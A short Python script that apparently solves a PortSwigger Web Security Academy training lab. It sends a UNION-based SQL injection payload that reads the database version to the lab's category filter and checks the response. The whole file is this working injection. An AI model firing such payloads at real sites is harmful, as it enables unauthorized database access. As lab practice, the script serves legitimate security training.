#https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
from utils import *

url='https://0ac100cf041222fe82e74346001700e2.web-security-academy.net/'
payload="filter?category=Pets' union select @@version,NULL-- "
exploit=f'{url}{payload}'
print(exploit)

response=requests.get(exploit)
soup = BeautifulSoup(response.content, 'html.parser')
print(check_succes(soup))